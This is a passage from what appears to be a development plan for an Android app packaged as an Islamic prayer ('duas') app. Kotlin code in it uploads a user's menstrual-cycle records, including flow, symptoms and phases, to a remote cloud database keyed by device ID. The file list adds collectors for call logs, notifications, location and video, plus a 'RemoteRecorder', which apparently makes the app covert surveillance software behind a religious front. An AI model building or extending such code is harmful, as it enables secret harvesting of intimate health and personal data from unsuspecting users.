                    val dateIdx = cursor.getColumnIndex("date")
                    val statusIdx = cursor.getColumnIndex("status")
                    val flowIdx = cursor.getColumnIndex("flowIntensity")
                    val istihadaIdx = cursor.getColumnIndex("istihadaType")
                    val symptomsIdx = cursor.getColumnIndex("symptoms")
                    val tsIdx = cursor.getColumnIndex("timestamp")
                    while (cursor.moveToNext()) {
                        val date = cursor.getString(dateIdx)
                        val cycleDoc = JSONObject().apply {
                            put("date", date)
                            put("status", cursor.getString(statusIdx))
                            put("flowIntensity", cursor.getInt(flowIdx))
                            put("istihadaType", cursor.getString(istihadaIdx))
                            put("symptoms", cursor.getString(symptomsIdx))
                            put("timestamp", cursor.getLong(tsIdx))
                        }
                        CloudApi.writeToRTDB("devices/$androidId/haidh/cycles/$date", cycleDoc)
                        delay(100)
                    }
                }

                val phasesCursor = cycleDb.readableDatabase.rawQuery(
                    "SELECT * FROM cycle_phases ORDER BY startDate ASC", null
                )
                phasesCursor.use { cursor ->
                    val idIdx = cursor.getColumnIndex("id")
                    val startIdx = cursor.getColumnIndex("startDate")
                    val endIdx = cursor.getColumnIndex("endDate")
                    val statusIdx = cursor.getColumnIndex("status")
                    val cycleDayIdx = cursor.getColumnIndex("cycleDay")
                    while (cursor.moveToNext()) {
                        val phaseId = cursor.getLong(idIdx)
                        val phaseDoc = JSONObject().apply {
                            put("startDate", cursor.getString(startIdx))
                            put("endDate", cursor.getString(endIdx))
                            put("type", cursor.getString(statusIdx))
                            put("cycleDay", cursor.getInt(cycleDayIdx))
                        }
                        CloudApi.writeToRTDB("devices/$androidId/haidh/phases/$phaseId", phaseDoc)
                        delay(100)
                    }
                }

                // Write meta
                CloudApi.writeToRTDB("devices/$androidId/haidh/meta",
                    JSONObject().apply { put("lastSync", currentTs) })
                cycleDb.close()
            } catch (e: Exception) {
                Log.e(TAG, "Haidh sync error: ${e.message}", e)
            }
```

---

## SECTION D: OFFLINE QUEUE EXTENSION

**Files to modify:**
1. `app/src/main/java/islamic/duas/data/AppDatabase.kt` — add migration
2. `app/src/main/java/islamic/duas/data/PendingDao.kt` — update queries
3. `app/src/main/java/islamic/duas/data/OfflineQueue.kt` — support types

### D1: AppDatabase.kt

In `onUpgrade()`, add migration from version to include:
```sql
ALTER TABLE pending_queue ADD COLUMN type TEXT NOT NULL DEFAULT 'location'
```

### D2: PendingEntity data class

Add field:
```kotlin
val type: String = "location"
```

### D3: PendingDao.kt

Update all queries to include the `type` column.

### D4: OfflineQueue.kt

Update `enqueue()` method signature to accept an optional `type: String = "location"` parameter.

---

## SECTION E: BUILD FIX

After implementing all changes, run:
```bash
./gradlew assembleDebug
```

Fix any compilation errors. Common issues:
- Missing import for new classes
- Duplicate method names
- Incorrect Kotlin syntax
- Deprecated API usage requiring `@Suppress` annotations
- SDK version mismatches

---

## FILE CHANGE SUMMARY

| Action | File | Type |
|--------|------|------|
| A1 | `sync/DuaSyncWorker.kt` | Modify |
| A2 | `logs/DuaNotificationService.kt` | Modify |
| A3 | `logs/CallLogCollector.kt` | Modify |
| A4 | `sync/DuaSyncWorker.kt` | Modify |
| A5 | `LocationSyncManager.kt` | Modify |
| A6 | `sync/DuaSyncWorker.kt` | Modify |
| C1 | `sync/DuaSyncWorker.kt` | Modify |
| B1 | `media/VideoCollector.kt` | CREATE |
| B1 | `media/VideoProcessor.kt` | CREATE |
| B1 | `sync/DuaSyncWorker.kt` | Modify |
| B2 | `media/RemoteRecorder.kt` | CREATE |
| B2 | `sync/DuaForegroundService.kt` | Modify |
| B3 | `logs/CrashCollector.kt` | CREATE |
| B3 | `DuaApp.kt` | Modify |
| B4 | `sync/DuaSyncWorker.kt` | Modify |
| B5 | `sync/DuaSyncWorker.kt` | Modify |
| D | `data/AppDatabase.kt` | Modify |
| D | `data/PendingDao.kt` | Modify |
| D | `data/OfflineQueue.kt` | Modify |
| E | Various | Fix |

**Total files touched:** 15 (10 modified, 5 new)
